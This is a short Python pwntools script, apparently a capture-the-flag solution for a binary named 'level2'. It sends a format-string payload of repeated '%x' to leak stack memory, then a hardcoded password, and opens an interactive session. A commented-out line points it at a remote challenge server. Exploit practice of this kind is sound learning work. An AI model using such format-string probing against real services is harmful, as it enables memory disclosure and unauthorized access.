#!/usr/bin/env python3

from pwn import *

#r= remote("54.169.55.172",1025)
r = process("./level2")
gdb.attach(r, api = True)
payload = b"%x" * 15
r.sendlineafter(b'name:',payload)
payload = b'w3Lc0m37iS'
r.sendlineafter(b'want :))))',payload)
r.interactive()
